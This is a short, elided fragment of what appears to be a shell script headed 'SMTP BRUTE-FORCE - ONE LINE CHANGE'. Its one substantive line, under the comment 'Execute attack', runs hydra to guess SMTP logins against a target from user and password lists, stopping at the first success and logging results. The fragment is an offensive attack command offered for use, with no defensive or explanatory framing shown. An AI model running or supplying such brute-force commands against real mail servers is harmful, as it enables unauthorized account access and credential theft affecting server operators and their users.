...
# ═══════════════════════════════════════════════════════════════════
# SMTP BRUTE-FORCE - ONE LINE CHANGE
# ═══════════════════════════════════════════════════════════════════
...
# Execute attack
hydra -L "$USERLIST" -P "$PASSLIST" -t "$THREADS" -f smtp://"$TARGET:$PORT" | tee -a "$PROJECT_ROOT/logs/smtp_attack.log"
